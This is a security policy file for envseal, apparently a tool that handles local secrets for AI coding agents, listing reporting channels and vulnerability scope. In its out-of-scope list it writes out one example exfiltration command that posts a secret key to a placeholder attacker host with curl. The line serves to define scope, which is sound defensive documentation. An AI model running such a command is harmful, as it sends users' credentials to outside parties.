# Security Policy

## Supported versions

| Version | Supported |
|---------|-----------|
| 0.x     | Development; not yet recommended for production use |
| 1.0+    | Full support (when released) |

## Reporting a vulnerability

**Do not open a public GitHub issue.** Please report security vulnerabilities privately:

- **Email:** security@envseal.dev
- **GitHub private vulnerability reporting:** https://github.com/envseal/envseal/security/advisories

## Expected response time

We aim to acknowledge receipt within 48 hours and provide an initial assessment or patch within 7 days for critical issues.

## Scope

### In scope

Vulnerabilities in the following components are eligible for security reports:

- The SEP/1 protocol specification and its reference implementation
- The broker (`packages/core`)
- The prompter adapters (loopback browser, native dialogs, TTY)
- The interception hooks (Claude Code plugin `PreToolUse`, `UserPromptSubmit`, `SessionStart`)
- The redactor and secret-value handling throughout
- The MCP, HTTP, SDK, and CLI bindings

### Out of scope

The following are explicitly not in scope for security reports:

- A compromised local machine, keylogger, or rootkit
- A malicious harness binary or agent implementation
- A user who deliberately runs `env_use -- curl attacker.example -d "$KEY"` after reading and accepting the confirmation dialog
- Secret distribution to teammates or production environments — envseal provisions a developer's local `.env`, not a production secret store
- Attacks on the provider's authentication endpoints themselves

For more detail on the threat model and what is defended against, see [docs/threat-model.md](docs/threat-model.md).

## Security considerations

See [docs/threat-model.md](docs/threat-model.md) for a detailed threat and mitigation analysis (T1–T14).

See [docs/residual-risks.md](docs/residual-risks.md) for five risks that remain even with the protocol in place.
